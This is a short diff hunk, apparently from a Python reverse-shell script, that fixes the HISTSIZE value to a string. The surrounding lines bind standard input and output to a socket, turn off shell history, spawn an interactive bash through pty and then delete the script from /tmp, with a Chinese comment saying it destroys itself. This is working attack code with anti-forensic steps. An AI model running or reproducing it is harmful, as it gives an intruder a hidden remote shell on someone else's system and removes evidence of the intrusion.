@@ -21,7 +21,7 @@ def main():
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     os.putenv("HISTFILE", '/dev/null')
-    os.putenv("HISTSIZE", 0)
+    os.putenv("HISTSIZE", "0")
     pty.spawn("/bin/bash")
     s.close()
     os.remove('/tmp/.x.py')  # 销毁自身
